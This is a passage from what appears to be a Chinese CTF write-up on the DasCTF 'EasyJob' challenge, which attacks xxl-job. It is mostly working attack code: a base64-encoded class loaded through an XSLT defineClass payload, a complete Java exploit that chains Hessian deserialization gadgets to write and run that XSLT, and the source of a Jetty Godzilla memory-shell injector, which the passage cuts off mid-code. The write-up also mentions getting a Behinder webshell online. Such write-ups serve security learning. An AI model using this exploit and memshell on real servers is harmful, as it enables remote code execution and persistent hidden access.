BFkDKlO2AN/AAMjAAMiwAAEAAAAsAC0AGwAEABwAAAAaAAYAAADQAAcA0QAtANIALgDTADUA1ABJANUAHQAAADQABQAHACYBRwCrAAEASQAmAUgAHwADAC4AQQFJAE4AAgAAAG8BSgDoAAAANQA6AUcAqwABACUAAAAWAAIABwAmAUcBSwABADUAOgFHAUsAAQArAAAABgABbQcAGwAOAAAACgAEAUMAnwChAJ0ACQDDAMQAAgAHAAAA1AAEAAYAAAA+uwFjWbcBaEy7AWVZKrcBa027AWdZLLcBbk4RAQC8CDoELRkEtgFyWTYFmwAPKxkEAxUFtgF2p//rK7YBerAAAAADABwAAAAeAAcAAADaAAgA2wARANwAGgDdACEA3wAtAOAAOQDiAB0AAAA+AAYAAAA+AVkApwAAAAgANgFaAVsAAQARAC0BXAFdAAIAGgAkAV4BXwADACEAHQFgAKcABAAqABQBYQDmAAUAKwAAABwAAv8AIQAFBwDIBwFjBwFlBwFnBwDIAAD8ABcBAA4AAAAEAAEAEAAIAGoAXAACAAcAAABXAAIAAwAAABEqK7gBgk0sBLYBhSwqtgGGsAAAAAIAHAAAAA4AAwAAAOYABgDnAAsA6AAdAAAAIAADAAAAEQF7AB8AAAAAABEBfADoAAEABgALAX0BfgACAA4AAAAEAAEAGwAIAX8BgAACAAcAAADHAAMABAAAACgqtgB9TSzGABksK7YBjU4tBLYBhS2wTiy2AZBNp//puwGIWSu3AZG/AAEACQAVABYBiAAEABwAAAAmAAkAAADsAAUA7QAJAO8ADwDwABQA8QAWAPIAFwDzABwA9AAfAPYAHQAAADQABQAPAAcBfQF+AAMAFwAFAE0BiQADAAAAKAF7AB8AAAAAACgBfADoAAEABQAjAKoAqwACACUAAAAMAAEABQAjAKoBSwACACsAAAANAAP8AAUHAH9QBwGICAAOAAAABAABAYgAKABbAFwAAgAHAAAAQgAEAAIAAAAOKisDvQB/A70ABLgBCbAAAAACABwAAAAGAAEAAAD6AB0AAAAWAAIAAAAOAZIAHwAAAAAADgGTAOgAAQAOAAAACAADAJ8AnQChACkAWwEHAAIABwAAAhcAAwAJAAAAyirBAH+ZAAoqwAB/pwAHKrYAfToEAToFGQQ6BhkFxwBkGQbGAF8sxwBDGQa2AaI6BwM2CBUIGQe+ogAuGQcVCDK2AaMrtgGmmQAZGQcVCDK2Aaq+mgANGQcVCDI6BacACYQIAaf/0KcADBkGKyy2ANE6Baf/qToHGQa2AZA6Bqf/nRkFxwAMuwCfWSu3Aau/GQUEtgDXKsEAf5kAGhkFAS22AN+wOge7AJhZGQe2Aa63Aa+/GQUqLbYA37A6B7sAmFkZB7YBrrcBr78AAwAlAHIAdQCfAJwAowCkAJ0AswC6ALsAnQADABwAAABuABsAAAD+ABQA/wAXAQEAGwECACUBBAApAQYAMAEHADsBCABWAQkAXQEKAGABBwBmAQ0AaQEOAHIBEgB1ARAAdwERAH4BEgCBARQAhgEVAI8BFwCVARgAnAEaAKQBGwCmARwAswEgALsBIQC9ASIAHQAAAHoADAAzADMBRgDmAAgAMAA2AZQBlQAHAHcABwBNAZYABwCmAA0ATQGXAAcAvQANAE0BlwAHAAAAygF7AB8AAAAAAMoBkwDoAAEAAADKAZgBmQACAAAAygGaAZsAAwAUALYAqgCrAAQAFwCzAZwAqQAFABsArwGdAKsABgArAAAALwAODkMHAH/+AAgHAH8HANMHAH/9ABcHAZ4BLPkABQIIQgcAnwsNVAcAnQ5HBwCdAA4AAAAIAAMAnwChAJ0ACAGwABkAAQAHAAAAJQACAAAAAAAJuwACWbcBsVexAAAAAQAcAAAACgACAAAAKQAIACoAAA==&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;org.junit.m.EncryptionUtils&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡ŒdefineClassçš„ç±»åè®°å¾—å†™æˆæ³¨å…¥å™¨çš„ç±»åï¼Œä¸€å¼€å§‹å¿˜æ”¹äº†å¡è¿™é‡Œå¥½ä¹…æœäº†ğŸ˜­</p></blockquote><p>æœ€åå†™ä¸€ä¸ªä¸€æŠŠæ¢­çš„exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-comment">//å‘é€postè¯·æ±‚ï¼Œå› ä¸ºHessianè¦å‘é€åŸç”Ÿçš„åºåˆ—åŒ–æ•°æ®</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postExp</span><span class="hljs-params">(String url1,<span class="hljs-type">byte</span>[] poc)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//åˆ›å»ºurlå¯¹è±¡</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url1);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚æ–¹æ³•ä¸º POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚å¤´</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// å…è®¸è¾“å‡º</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è®¾ç½®è¯·æ±‚ä½“</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// è·å–å“åº”ç </span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// å…³é—­è¿æ¥</span><br>        connection.disconnect();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadXslt</span><span class="hljs-params">(String url, String xsltFilePath)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//å»ä¿®æ”¹è¿™é‡Œå†™å…¥çš„æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAttack</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//è§£æxsltæ–‡ä»¶ç”Ÿæ•ˆ</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>&#125;&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;http://127.0.0.1:8080/api&quot;</span>;<br>        uploadXslt(url, <span class="hljs-string">&quot;payload.xslt&quot;</span>);<br>        doAttack(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128173705623.png" alt="image-20241128173705623"></p><p>ç„¶åå†°èä¸Šçº¿</p><p><img src="https://cdn.clown2024.cn/image-20241128173725650.png" alt="image-20241128173725650"></p><p><img src="https://cdn.clown2024.cn/image-20241128173740656.png" alt="image-20241128173740656"></p><h2 id="executoræœªæˆæƒ"><a href="#executoræœªæˆæƒ" class="headerlink" title="executoræœªæˆæƒ"></a>executoræœªæˆæƒ</h2><p>å±å®æ˜¯å¹²æ— è¯­äº†ç»™æˆ‘ï¼Œæ‰“äº†åŠå¤©å‘ç°é¢˜ç›®æ˜¯æ‰“çš„executoræœªæˆæƒï¼Œé¢˜ç›®å¥½åƒæ˜¯åªç»™äº†ä¸€ä¸ªexecutorçš„ç«¯å£ï¼Œæˆ‘æœ¬åœ°æ­çš„æ‰€ä»¥adminå’Œexecutorç«¯å£éƒ½æœ‰ï¼Œç„¶åapiæœªæˆæƒä¹Ÿæ˜¯èƒ½æ­£å¸¸æ‰“ï¼Œç›´æ¥æ‰“åäº†</p><p>executoræˆ‘ä»¬è®¿é—®9999ç«¯å£ä»–çš„å›æ˜¾æ˜¯è¿™æ ·çš„</p><p><img src="https://cdn.clown2024.cn/image-20241128162332049.png" alt="image-20241128162332049"></p><p>è¿™é‡Œä¹Ÿæ˜¯ç”¨çš„hessianååºåˆ—åŒ–è¯»å–æ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å»xxl-jobçš„executorçš„æºç çœ‹åˆ°jettyæœåŠ¡çš„å¯åŠ¨æºç </p><p><img src="https://cdn.clown2024.cn/image-20241128163747857.png" alt="image-20241128163747857"></p><p>è¿™é‡Œåªè®¾ç½®äº†ä¸€ä¸ªJettyServerHandlerï¼Œæ‰€æœ‰è¯·æ±‚éƒ½ä¼šç”±è¿™ä¸ªJettyServerHandleræ¥å¤„ç†ï¼Œçœ‹ä¸€ä¸‹æºç </p><p><img src="https://cdn.clown2024.cn/image-20241128163951810.png" alt="image-20241128163951810"></p><p>å¯ä»¥çœ‹åˆ°ä»–è¿™é‡Œä¹Ÿæ˜¯è¿›è¡ŒHessianååºåˆ—åŒ–å¤„ç†ï¼Œå’Œæˆ‘ä»¬å‰é¢adminçœ‹åˆ°çš„å¤„ç†æ–¹å¼æ˜¯ä¸€æ ·çš„</p><p>é‚£æˆ‘ä»¬å°±éœ€è¦å»æ³¨å…¥ä¸€ä¸ªhandlerï¼Œä¹Ÿå°±æ˜¯jettyçš„å†…å­˜é©¬ï¼Œç›´æ¥æŠ„wpçš„äº†ï¼Œä¸€å¼€å§‹ç”¨å†…å­˜é©¬ç”Ÿæˆå™¨ç”Ÿæˆäº†æ‰“ä¸è¿›å»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xxl.job.core;<br><br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.*;<br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.handler.AbstractHandler;<br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.handler.HandlerCollection;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.ref.Reference;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">//author:Boogipop</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JettyGodzillaMemshell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandler</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;3c6e0b8a9c15224a&quot;</span>; <span class="hljs-comment">// key</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">pass</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;username&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">md5</span> <span class="hljs-operator">=</span> md5(pass + xc);<br>    Class payload;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">md5</span><span class="hljs-params">(String s)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            java.security.MessageDigest m;<br>            m = java.security.MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>            m.update(s.getBytes(), <span class="hljs-number">0</span>, s.length());<br>            ret = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.math.BigInteger(<span class="hljs-number">1</span>, m.digest()).toString(<span class="hljs-number">16</span>).toUpperCase();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JettyGodzillaMemshell</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JettyGodzillaMemshell</span><span class="hljs-params">(<span class="hljs-type">int</span> s)</span> &#123;<br>        System.out.println(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">HttpConnection</span> <span class="hljs-variable">valueField</span> <span class="hljs-operator">=</span> getValueField();<br>            <span class="hljs-type">HandlerCollection</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (HandlerCollection) valueField.getHttpChannel().getServer().getHandler();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">mutableWhenRunning</span> <span class="hljs-operator">=</span> handler.getClass().getDeclaredField(<span class="hljs-string">&quot;_mutableWhenRunning&quot;</span>);<br>            mutableWhenRunning.setAccessible(<span class="hljs-literal">true</span>);<br>            mutableWhenRunning.set(handler,<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//            handler.addHandler(new JettyHandlerMemshell(1));</span><br>            Handler[] handlers = handler.getHandlers();<br>            Handler[] newHandlers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>[handlers.length+<span class="hljs-number">1</span>];<br>            newHandlers[<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">JettyGodzillaMemshell</span>(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; handlers.length; i++) &#123;<br>                newHandlers[i + <span class="hljs-number">1</span>] = handlers[i];<br>            &#125;<br>            handler.setHandlers(newHandlers);<br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> sun.misc.Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unsafe.setAccessible(<span class="hljs-literal">true</span>);<br>        sun.misc.<span class="hljs-type">Unsafe</span> <span class="hljs-variable">theunsafe</span> <span class="hljs-operator">=</span> (sun.misc.Unsafe) unsafe.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> theunsafe;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HttpConnection <span class="hljs-title function_">getValueField</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, ClassNotFoundException, IllegalAccessException &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>        <span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> Thread.currentThread().getThreadGroup();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">threadsfiled</span> <span class="hljs-operator">=</span> threadGroup.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);<br>        Thread[] threads = (Thread[]) unsafe.getObject(threadGroup, unsafe.objectFieldOffset(threadsfiled));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;threads.length;i++) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Field</span> <span class="hljs-variable">threadLocalsF</span> <span class="hljs-operator">=</span> threads[i].getClass().getDeclaredField(<span class="hljs-string">&quot;threadLocals&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">threadlocal</span> <span class="hljs-operator">=</span> unsafe.getObject(threads[i], unsafe.objectFieldOffset(threadLocalsF));<br>                Reference[] table = (Reference[]) unsafe.getObject(threadlocal, unsafe.objectFieldOffset(threadlocal.getClass().getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>)));<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;table.length;j++)&#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//HttpConnection value = (HttpConnection) unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(&quot;value&quot;)));</span><br>                        <span class="hljs-comment">//PrintWriter writer = value.getHttpChannel().getResponse().getWriter();</span><br>                        <span class="hljs-comment">//writer.println(Runtime.getRuntime().exec(value.getHttpChannel().getRequest().getParameter(&quot;cmd&quot;)));</span><br>                        <span class="hljs-comment">//writer.flush();</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span>unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(<span class="hljs-string">&quot;value&quot;</span>)));<br>                        <span class="hljs-keyword">if</span>(value.getClass().getName().equals(<span class="hljs-string">&quot;org.eclipse.jetty.server.HttpConnection&quot;</span>))&#123;<br>                            <span class="hljs-keyword">return</span> (HttpConnection)value;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> (Exception e)&#123;<br><br>                    &#125;<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64Encode</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class base64;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64 = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);<br>            value = (String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encodeToString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64 = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.newInstance();<br>                value = (String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] base64Decode(String bs) <span 